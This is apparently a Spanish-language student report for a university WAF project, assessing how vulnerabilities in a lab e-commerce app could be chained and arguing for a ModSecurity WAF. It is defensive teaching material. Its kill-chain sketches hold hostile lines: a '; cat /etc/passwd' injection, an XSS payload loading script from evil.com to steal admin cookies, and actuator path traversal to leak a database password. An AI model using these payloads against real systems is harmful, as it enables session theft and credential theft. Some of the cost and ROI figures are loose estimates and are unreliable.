# ¿Qué se podría hacer con los PoCs identificados?
## Análisis de impacto y escalación · TPE WAF · ITBA · 1C 2026

> Las vulnerabilidades aisladas son interesantes; **lo que mata es la cadena**. Este documento responde a la pregunta de fondo de la presentación: si un atacante tuviese estas vulnerabilidades en sus manos contra un The Store en producción, ¿qué podría hacer? La respuesta cubre tres horizontes de daño: (a) lo que se puede hacer **HOY**, (b) lo que se puede hacer **MAÑANA** si la app evoluciona "naturalmente" sin WAF, y (c) **escenarios de breach reales** análogos publicados en los últimos 5 años.
>
> Esto es lo que va al PPT como justificación final de "por qué necesitamos el WAF" — no en abstracto, sino en daño cuantificable.

---

## Tabla 1 · Impacto inmediato por PoC (lo que se puede hacer HOY)

| PoC | Vulnerabilidad | Lo que un atacante hace HOY |
|---|---|---|
| **#1** Prometheus expuesto | Information disclosure masiva | Recibe en 1 request: nombres de los 4 microservicios internos, JVM y heap config, capacidad de disco del nodo, lista de paths llamados recientemente *por OTROS atacantes* (canal pasivo de OSINT), excepciones internas, GC stats — todo lo necesario para planear el siguiente ataque. |
| **#2-4** Spring Actuator abierto | Stack confirmation + recon | Confirma versión de Spring Boot → busca CVEs específicos. Lista las 44 métricas instrumentadas → sabe qué consultar. Enumera health groups → infiere arquitectura. |
| **#5-6** IDOR en `/proxy/carts/{id}` | Privacy + competitive intel | Itera customer IDs (UUID-bruteforce o lista de emails leakeada) y dumpea el carrito de cada cliente: qué productos eligió, en qué orden, cuántos. En el TPE el carrito está vacío; en producción es **competitive intelligence + violación de privacidad** directa. |
| **#7-8** Path traversal vía proxy | Bypass de filtros futuros | Bypasea cualquier filtro que se agregue al UI restringiendo `/actuator/*` — la traversal escapa al UI por una vía que el dev no esperaba. |
| **#9-10** Backends ClusterIP alcanzables | Network segmentation rota | Ataca directamente los servicios internos: `carts`, `orders`, `checkout`. Cada uno tiene su propio set de endpoints y vulnerabilidades. La separación "interno vs externo" que justifica el diseño Kubernetes queda anulada. Bonus: header `x-powered-by: Express` en checkout = stack disclosure. |
| **#11** SQLi en query string aceptado | Iteración silenciosa | Aunque el catalog usa Gorm parametrizado, la app no alarma → atacante itera 10.000 payloads buscando uno que sí funcione (XXE, NoSQL injection, polyglot, etc.) sin que el equipo de seguridad lo note. |
| **#12** RCE patterns aceptados | Idem #11 | El payload `; cat /etc/passwd` pasa con 200 OK. El día que algún backend pase ese parámetro a un `os.exec()` (legacy code, nuevo feature, refactor mal hecho), explota silenciosamente. |
| **#13** XSS aceptado en checkout | Persistencia + amplificación post-DB | Se persiste en el carrito/orden. Cuando un admin ve la orden en su dashboard, el XSS ejecuta. **Robo de sesión del admin = compromiso total de la plataforma.** |
| **#14** X-Forwarded-* spoofeable | Falsa atribución + bypass de bans | Los logs registran la IP atacante como `8.8.8.8` (o cualquier víctima inocente). Bypassea cualquier IP-banning, alimenta investigaciones forenses en círculos, complica la atribución. |
| **#15-16** Sin scanner detection | Reconocimiento masivo silencioso | Corre `sqlmap`, `nikto`, `nuclei`, `dirbuster` con headers default — *cero* alarmas en logs. Mapea toda la app, encuentra vulnerabilidades sin ser visto. |
| (no testeado) Sin rate limit | DoS aplicacional + brute force | 167 req/s sostenidas → puede agotar el thread pool del JVM (8 threads core, 200 max según el dump de Prometheus). 5 atacantes coordinados = downtime. |
| (transversal) Cero headers seguridad | Amplificación de cualquier XSS encontrado | Sin CSP, cualquier XSS reflejado se vuelve fácil de explotar; sin X-Frame-Options, clickjacking; sin HSTS, MITM en cafetería. |

---

## Tabla 2 · Escalación a 30 días (lo que se puede hacer MAÑANA)

Estos son escenarios que dependen de **un cambio menor en la app** — el típico commit que parece inocuo pero combinado con las vulnerabilidades existentes se vuelve catastrófico.

| Cambio "inocente" en la app | Impacto cuando se cruza con los PoCs actuales |
|---|---|
| Dev agrega `env` al `management.endpoints.web.exposure.include` para debuggear un bug en staging | `GET /actuator/env` y `GET /proxy/catalog/../../actuator/env` retornan **TODAS las variables de entorno**, incluyendo `RETAIL_CATALOG_PERSISTENCE_PASSWORD` (que ya existe encodeado en kubernetes.yaml). Atacante decodifica base64 → tiene la pass de la DB del catalog. |
| Dev agrega `heapdump` al include para troubleshooting de memoria | `GET /actuator/heapdump` baja **un dump binario del heap** del JVM con *todas las sesiones activas*, tokens JWT en memoria, contraseñas en plain text si pasaron por StringBuilder, etc. Eclipse MAT lo abre y se extraen credenciales en minutos. |
| Equipo de pricing agrega `@PostMapping` al ProxyController "para que la API sea simétrica" | El IDOR del PoC#5 deja de ser solo lectura: atacante puede **escribir items y precios falsos en el carrito de cualquier cliente**, generando órdenes fraudulentas a su nombre o vaciando carritos legítimos. |
| Activación del ChatBot LLM (`retail.ui.chat.enabled=true`) | El endpoint `/chat/submit` se vuelve activo. Sin validación, atacante hace **prompt injection** para extraer el system prompt, **DoS por costo** mandando mensajes gigantes (1 MB de input cada uno = quema $$ de la cuenta de OpenAI), o **jailbreak** para que el bot recomiende productos de la competencia. |
| Migración de `in-memory` a MySQL/Postgres en `RETAIL_CATALOG_PERSISTENCE_PROVIDER` | El día que cambien a una DB real, los payloads SQLi del PoC#11 que hoy "pasan benignamente" empiezan a explotar de verdad. Sin WAF, no hay capa que avise — empieza a salir data del backend. |
| Algún backend pasa el `tag` query param a un `os/exec.Command` (caso real visto en muchos catalogs cuando agregan "thumbnail generator") | El payload `; cat /etc/passwd` del PoC#12 se vuelve RCE real. |
| Equipo de marketing agrega un endpoint que loggea o muestra el carrito en un dashboard de admin sin sanitización | El XSS persistido del PoC#13 ejecuta en el navegador del admin → robo de su sesión → compromiso total. |
| Refactor de la persistencia que cambia el formato del path en el backend `carts` | El IDOR de los PoCs #5/#6 podría dejar de exponer solo el customerId y empezar a aceptar paths más sensibles (`/carts/admin/orders`, `/carts/admin/payments`). Si nadie revisa el alcance del proxy, el ataque escala automáticamente. |

---

## Tabla 3 · Kill chains combinadas (lo que un atacante real haría)

Los PoCs no se usan aisladamente — se encadenan. Acá tres cadenas típicas con su daño final:

### Cadena A · "Information Disclosure → Full Recon"
**Tiempo: 5 minutos · Skill requerido: muy bajo · Visibilidad: cero**

```
1. GET /actuator/prometheus           [PoC#1]
   → mapa de microservicios, paths, JVM info

2. GET /proxy/{carts,orders,checkout}/anything   [PoC#9-10]
   → confirma que cada backend responde, identifica stack

3. GET /proxy/carts/{admin,test,1,users,...}     [PoC#5-6]
   → dumpea carritos enumerando IDs

4. GET / -A "sqlmap/1.7.2"            [PoC#15]
   → corre sqlmap completo sin alertas
```

**Resultado:** atacante tiene mapa completo de la infra, contenido de carritos de clientes, y un escaneo de vulnerabilidades sin ser detectado. **Próximo paso:** publicar la lista de carritos en un foro de competencia / vender data en mercados negros / extorsionar al e-commerce.

---

### Cadena B · "Proxy Pivot → Credenciales"
**Tiempo: depende del cambio de config (días o semanas) · Skill: medio · Visibilidad: cero**

```
1. Atacante descubre el proxy y el traversal      [PoC#7-8]
   → tiene un canal para hablar con el actuator del UI

2. Espera a que algún dev agregue 'env' o 'heapdump' al include
   (suele pasar dentro de los primeros 6 meses de un proyecto activo)

3. GET /proxy/catalog/../../actuator/env          [variante de PoC#7]
   → JSON con todas las vars del pod, incluyendo
     RETAIL_CATALOG_PERSISTENCE_PASSWORD = base64

4. echo "$pass" | base64 -d
   → password de la DB del catalog en plain text

5. Conexión directa a la DB (si el cluster expone el puerto, o vía
   otro pivot) → exfiltración del catálogo entero, modificación de
   precios, inserción de productos falsos.
```

**Resultado:** acceso completo a la DB del catalog → control del inventario y precios → posibilidad de inyectar productos backdoor o modificar precios para arbitraje.

---

### Cadena C · "XSS persistido → Compromiso del admin → Takeover"
**Tiempo: depende del flujo de revisión interna · Skill: alto · Visibilidad: cero hasta que sea muy tarde**

```
1. POST /checkout con firstName=<script src=//evil.com/x.js></script>   [PoC#13]
   → payload XSS persistido en el carrito (en producción, en orders DB)

2. Atacante completa el flujo y genera una orden real con su payload
   en el firstName.

3. Cualquier admin que abra el panel de órdenes ejecuta el JS de evil.com.

4. evil.com/x.js hace: document.cookie + fetch('/api/admin/users') →
   robo de sesión de admin + dump de la lista de usuarios.

5. Con la sesión del admin: cambiar precios, refundir órdenes a cuentas
   propias, ver datos de clientes, exportar la base completa.
```

**Resultado:** **takeover total de la plataforma a través de un campo de input de checkout.** Esto es el patrón de breach más común contra e-commerce (Magecart, BriansClub, etc).

---

## Tabla 4 · Análogos en breaches reales (los últimos 5 años)

Para que las vulnerabilidades no parezcan "académicas", estos son **breaches públicos reales** que combinaron exactamente estos vectores:

| Breach real | Año | Vectores | Conexión con nuestros PoCs |
|---|---|---|---|
| **Capital One** (100M de cuentas leakeadas) | 2019 | SSRF a metadata service de AWS desde un WAF mal configurado | Mismo patrón estructural que **PoC#7-10**: SSRF/proxy reaching internal endpoints not meant for external access. |
| **Log4Shell** (Log4j RCE) | 2021 | Payload en HTTP header pasado a logger sin sanitizar | El **PoC#15-16** demuestra que cualquier payload en header pasa sin filtro — Log4Shell hubiese sido explotable acá durante semanas si nadie miraba. |
| **Optus (Australia)** (10M de records) | 2022 | API expuesta con IDs secuenciales sin auth | **PoC#5-6** es exactamente eso: IDOR enumerable. |
| **23andMe** (6.9M usuarios) | 2023 | Credential stuffing sin rate limit + acceso a árbol genético compartido | El **PoC del rate limit** del informe muestra que se aceptan 167 req/s sin throttling. |
| **MOVEit Transfer** (~2.500 organizaciones) | 2023 | SQLi → file disclosure → exfil masiva | **PoC#11** muestra que la app acepta SQLi sin alertar — el día que un backend la procese mal, queda igual. |
| **Spring4Shell** (CVE-2022-22965) | 2022 | RCE vía data binding en Spring | Specific Spring Boot CVE — la versión exacta se obtiene de **PoC#3** (info) y **PoC#4** (metrics). |

---

## Tabla 5 · Daño en moneda real

Para que la presentación tenga el "click" emocional, aterricemos en plata para un e-commerce hipotético del tamaño de The Store si fuera real (digamos $10M USD/año en GMV):

| Tipo de daño | Estimación conservadora | Origen |
|---|---|---|
| Cumplimiento (PCI-DSS) | Multa de USD 5K–100K/mes por estar fuera de compliance | Requirement 6.6 obliga WAF para sitios que procesan tarjetas. |
| Privacidad (GDPR / Ley 25.326 Argentina) | USD 20M o 4% de revenue (lo que sea mayor) | Por la fuga de datos personales del PoC #5 (carritos = customer data). |
| Bot abuse / scraping de catálogo | USD 50K–500K/año en costos de infra y precios igualados por competencia | Sin rate limit ni scanner detection (PoC #15-16). |
| Fraude por XSS persistido + takeover de admin | USD 100K–1M en órdenes fraudulentas + chargebacks | Cadena C de arriba — patrón Magecart. |
| Ransom de DB filtrada via cadena B | USD 500K–5M (rescate típico de ransomware/extortion) | Cadena B. |
| Costo de incident response + comunicación a usuarios + crisis PR | USD 200K–1M | Por evento. |

**Total potencial anualizado, conservador: USD 1M – 10M en pérdidas evitables**

**Costo del WAF (ModSecurity + OWASP CRS):** licencia $0 (open source) + 0,1 vCPU + 64 MB RAM extra en el ingress controller + ~3 días/persona de setup y tuning inicial.

**ROI:** ~1.000.000:1 en el peor escenario, ~100:1 en uno conservador.

---

## Síntesis para el PPT (3 slides resumen)

### Slide A · "Lo que se puede hacer HOY contra The Store sin WAF"
- 3 minutos de un atacante con un navegador.
- Mapa completo de los 4 microservicios.
- Lectura del carrito de cualquier cliente.
- 25 KB de métricas internas leakeadas por hit.
- Backends "ClusterIP" alcanzables desde Internet.
- Cero detección, cero rate limit, cero headers de seguridad.

### Slide B · "Lo que se puede hacer MAÑANA si nadie reacciona"
- Una línea de YAML cambiada (`include: env`) → exfiltración de credenciales.
- Un `@PostMapping` agregado al ProxyController → manipulación de carritos ajenos.
- Una migración de in-memory a MySQL → SQLi explotable.
- Un dashboard nuevo de admin sin sanitización → XSS persistido → takeover.

### Slide C · "Por qué un WAF cambia esto"
- 4 reglas básicas (deny `/actuator`, deny path traversal, scanner detection UA, rate limit) cierran **el 80%** de los vectores demostrados.
- 2 reglas custom (anti-prompt-injection, validar Authorization en `/proxy/carts/`) cierran el resto.
- Costo: una imagen Docker, un ConfigMap, 0,1 vCPU.
- Beneficio: el ROI calculado arriba.
- Bonus: defensa proactiva contra los cambios "inocentes" de mañana — sin pedirle nada al equipo de devs.

---

## Cierre

Las vulnerabilidades del informe no son hipótesis: son palancas concretas que un atacante con conocimientos básicos puede operar desde su navegador. Lo único que las separa hoy de ser un breach real es:

1. Que el cluster está local en una máquina del grupo (no en Internet).
2. Que el chat está deshabilitado por default.
3. Que `env` y `heapdump` no fueron incluidos en el `include` del actuator.
4. Que el código del catalog usa Gorm parametrizado.

Tres de esas cuatro condiciones **dependen de decisiones de configuración o de código**. Cualquiera puede romperse en el siguiente commit. La cuarta condición (cluster en local) deja de existir el día que la app se publica.

**El WAF es la única capa que sigue defendiendo cuando los devs se equivocan.** Ese es el argumento de cierre del TP.
